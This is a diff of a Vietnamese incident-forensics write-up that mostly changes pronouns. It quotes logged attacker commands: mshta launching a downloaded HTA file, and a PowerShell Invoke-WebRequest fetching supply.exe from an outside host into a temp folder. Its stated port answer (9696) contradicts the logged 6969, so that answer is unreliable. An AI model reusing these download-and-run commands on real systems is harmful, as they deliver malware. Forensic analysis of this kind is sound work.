@@ -5,7 +5,7 @@
 ## Solution
 > ***What is the file that gave access to the attacker?***
 
-- Đầu tiên em xem xét qua tất cả các phần của file, thấy rằng nó có lưu các lệnh cmd.
+- Đầu tiên ta xem xét qua tất cả các phần của file, thấy rằng nó có lưu các lệnh cmd.
 - Theo dõi thì thấy có 1 lệnh cmd đáng ngờ.
 ```
       "CommandLine": "\"C:\\Windows\\SysWOW64\\mshta.exe\" \"C:\\Users\\IEUser\\Downloads\\updater.hta\" {1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5} "
@@ -19,7 +19,7 @@
 
 > ***What is the powershell cmdlet used to download the malware file and what is the port?***
 
-- Tiếp tục tìm với command em bắt gặp 1 lệnh như thế này 
+- Tiếp tục tìm với command ta dễ dàng bắt gặp 1 lệnh như thế này 
 ``` "CommandLine": "powershell  -c INvoke-WebRequest -Uri http://192.168.1.11:6969/supply.exe -OutFile C:\\Windows\\Temp\\supply.exe"```
 - Bắt đầu lệnh powershell tạo 1 kết nối tới web thông qua `-c INvoke-WebRequest` và tải xuống tệp `http://192.168.1.11:6969/supply.exe` và lưu tại `C:\\Windows\\Temp\\supply.exe`
 > A : INvoke-WebRequest, 9696
